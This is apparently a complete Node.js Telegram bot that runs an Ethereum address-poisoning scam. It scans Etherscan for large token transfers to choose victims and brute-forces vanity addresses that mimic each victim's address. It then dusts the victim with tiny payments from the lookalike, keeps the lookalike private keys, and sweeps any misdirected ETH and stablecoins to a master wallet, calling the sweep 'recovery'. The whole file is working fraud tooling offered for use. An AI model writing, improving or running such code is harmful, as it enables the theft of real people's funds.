const { ethers } = require("ethers");
const { Telegraf, Markup } = require('telegraf');
const mongoose = require('mongoose');
const axios = require('axios');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
require('dotenv').config();

// --- 1. Database Setup ---
mongoose.connect(process.env.MONGO_URI);
const Target = mongoose.model('Target', {
    address: { type: String, unique: true },
    isDusted: { type: Boolean, default: false },
    vanityAddress: String,
    vanityPrivateKey: String, // <--- Now we store the key
    asset: String,
    timestamp: { type: Date, default: Date.now }
});

// --- 2. Vanity Worker Logic ---
if (!isMainThread) {
    const { prefix, suffix } = workerData;
    (async () => {
        while (true) {
            const wallet = ethers.Wallet.createRandom();
            const addr = wallet.address.toLowerCase();
            if (addr.startsWith("0x" + prefix) && addr.endsWith(suffix)) {
                parentPort.postMessage({ address: wallet.address, privateKey: wallet.privateKey });
                break;
            }
        }
    })();
    return;
}

// --- 3. Bot & Provider Setup ---
const bot = new Telegraf(process.env.BOT_TOKEN);
const provider = new ethers.JsonRpcProvider(process.env.RPC_HTTP);
const masterWallet = new ethers.Wallet(process.env.MASTER_PRIVATE_KEY, provider);

// --- 3. Bot & Provider Setup --- (REPLACE THIS SECTION)
const TOKENS = {
    USDT: { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", dec: 6, min: 5000 },
    USDC: { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", dec: 6, min: 5000 },
    WBTC: { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", dec: 8, min: 0.1 },
    WETH: { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", dec: 18, min: 2 },
    DAI:  { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", dec: 18, min: 5000 }
};

// --- 4. Free Whale Fetcher (Recent Transfers) ---
async function fetchRecentWhales() {
    const apiKey = process.env.ETHERSCAN_KEY;
    const whales = [];

    // Fetch USDT & USDC Transfers (Free Tier allows 5 calls/sec)
    for (const [symbol, info] of Object.entries(TOKENS)) {
        const url = `https://api.etherscan.io/api?module=account&action=tokentx&contractaddress=${info.addr}&page=1&offset=20&sort=desc&apikey=${apiKey}`;
        const res = await axios.get(url);
        
        if (res.data.result && Array.isArray(res.data.result)) {
            for (const tx of res.data.result) {
                const amount = parseFloat(ethers.formatUnits(tx.value, info.dec));
               if (amount > info.min) { // Uses the 'min' we defined in the TOKENS object above
    const exists = await Target.findOne({ address: tx.to });
    if (!exists || !exists.isDusted) {
        whales.push({ addr: tx.to, bal: amount, asset: symbol });
    }
}
            }
        }
    }
    // Return unique results, richest first
    return whales.sort((a, b) => b.bal - a.bal).slice(0, 5);
}

// A minimal ABI to interact with any ERC-20 token
const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 amount) public returns (bool)"
];

async function sweepEverything(ctx) {
    const targets = await Target.find({ vanityPrivateKey: { $ne: null } });
    let totalEthRecovered = 0;
    let tokensRecovered = [];

    for (const target of targets) {
        try {
            const vanityWallet = new ethers.Wallet(target.vanityPrivateKey, provider);
            const ethBalance = await provider.getBalance(vanityWallet.address);
            
            for (const [symbol, info] of Object.entries(TOKENS)) {
                const tokenContract = new ethers.Contract(info.addr, ERC20_ABI, vanityWallet);
                const tokenBalance = await tokenContract.balanceOf(vanityWallet.address);

                if (tokenBalance > 0n) {
                    const feeData = await provider.getFeeData();
                    const gasLimit = 65000n; 
                    const requiredGas = feeData.gasPrice * gasLimit;

                    // --- SELF-FUELING LOGIC ---
                    // If vanity has tokens but NOT enough ETH for gas
                    if (ethBalance < requiredGas) {
                        const topUpAmount = requiredGas + ethers.parseEther("0.0005"); // Gas + buffer
                        const fuelTx = await masterWallet.sendTransaction({
                            to: vanityWallet.address,
                            value: topUpAmount
                        });
                        await fuelTx.wait();
                        // Wait briefly for provider to sync balance
                        await new Promise(r => setTimeout(r, 2000));
                    }

                    // Now perform the token sweep
                    const tx = await tokenContract.transfer(masterWallet.address, tokenBalance);
                    await tx.wait();
                    tokensRecovered.push(`${ethers.formatUnits(tokenBalance, info.dec)} ${symbol}`);
                }
            }

            // --- FINAL ETH SWEEP ---
            const finalEthBal = await provider.getBalance(vanityWallet.address);
            const feeData = await provider.getFeeData();
            const ethGasLimit = 21000n;
            const ethGasCost = feeData.gasPrice * ethGasLimit;

            if (finalEthBal > ethGasCost) {
                const valueToSend = finalEthBal - ethGasCost;
                const tx = await vanityWallet.sendTransaction({
                    to: masterWallet.address,
                    value: valueToSend,
                    gasLimit: ethGasLimit,
                    gasPrice: feeData.gasPrice
                });
                await tx.wait();
                totalEthRecovered += parseFloat(ethers.formatEther(valueToSend));
            }

            // Mark as recovered
            target.vanityPrivateKey = null;
            await target.save();

        } catch (e) {
            console.error(`Fueling/Sweep failed for ${target.address}:`, e.message);
        }
    }
    return { eth: totalEthRecovered, tokens: tokensRecovered };
}

// --- 5. Bot Commands ---
bot.start(async (ctx) => {
    await ctx.reply("🧹 **Phase 1: Recovery Mode**\nCleaning up all vanity addresses...");
    const report = await sweepEverything();

    const ethBal = await provider.getBalance(masterWallet.address);
    let portfolio = `💰 **Master Portfolio**\nETH: ${parseFloat(ethers.formatEther(ethBal)).toFixed(4)}\n`;
    
    // Add Token Balances to View
    for (const [symbol, info] of Object.entries(TOKENS)) {
        const contract = new ethers.Contract(info.addr, ERC20_ABI, provider);
        const b = await contract.balanceOf(masterWallet.address);
        if (b > 0n) portfolio += `${symbol}: ${ethers.formatUnits(b, info.dec)}\n`;
    }

    let recoveryMsg = `✅ **Swept:** ${report.eth.toFixed(5)} ETH`;
    if (report.tokens.length > 0) recoveryMsg += `\n🎁 **Tokens:** ${report.tokens.join(', ')}`;

    await ctx.reply(`${recoveryMsg}\n\n${portfolio}`, Markup.inlineKeyboard([
        [Markup.button.callback('🔍 Scan Whales', 'scan')],
        [Markup.button.callback('📜 View Dusted History', 'history')]
    ]));
});

bot.action('scan', async (ctx) => {
    ctx.editMessageText("🔎 Searching for high-value transfers...");
    const list = await fetchRecentWhales();
    
    if (list.length === 0) return ctx.reply("❌ No new whales found. Try again in 5 mins.");

    let msg = "💎 **TOP UNDUSTED WHALES**\n\n";
    list.forEach((w, i) => {
        msg += `${i+1}. **${w.bal.toLocaleString()} ${w.asset}**\nAddr: \`${w.addr}\`\nAction: /dust_${w.addr}\n\n`;
    });
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.action('history', async (ctx) => {
    const items = await Target.find({ isDusted: true }).limit(5).sort({ timestamp: -1 });
    let msg = "📜 **LAST 5 DUSTED**\n\n";
    items.forEach(i => msg += `✅ \`${i.address}\`\n`);
    ctx.reply(msg || "History is empty.");
});

bot.hears(/^\/dust_(0x[a-fA-F0-9]{40})$/, async (ctx) => {
    const target = ctx.match[1];
    const prefix = target.substring(2, 6);
    const suffix = target.slice(-3);

    ctx.reply(`🛰️ **Sequence Initiated**\n1. Brute-forcing vanity...\n2. Funding...\n3. Dusting...`);

    const worker = new Worker(__filename, { workerData: { prefix, suffix } });
    worker.on('message', async (vanity) => {
        try {
            // Fund Vanity
            const fund = await masterWallet.sendTransaction({ to: vanity.address, value: ethers.parseEther("0.004") });
            await fund.wait();

            // Send Dust
            const vanitySigner = new ethers.Wallet(vanity.privateKey, provider);
            const dust = await vanitySigner.sendTransaction({ to: target, value: ethers.parseEther("0.0001") });
            
            // Update History
            await Target.findOneAndUpdate(
        { address: target }, 
        { 
            isDusted: true, 
            vanityAddress: vanity.address, 
            vanityPrivateKey: vanity.privateKey // <--- IMPORTANT
        }, 
        { upsert: true }
    );

            ctx.reply(`✨ **Success!**\nTarget: \`${target}\`\nVanity: \`${vanity.address}\`\n[View Tx](https://etherscan.io/tx/${dust.hash})`, { parse_mode: 'Markdown' });
        } catch (e) { ctx.reply(`❌ Error: ${e.message}`); }
    });
});

bot.launch();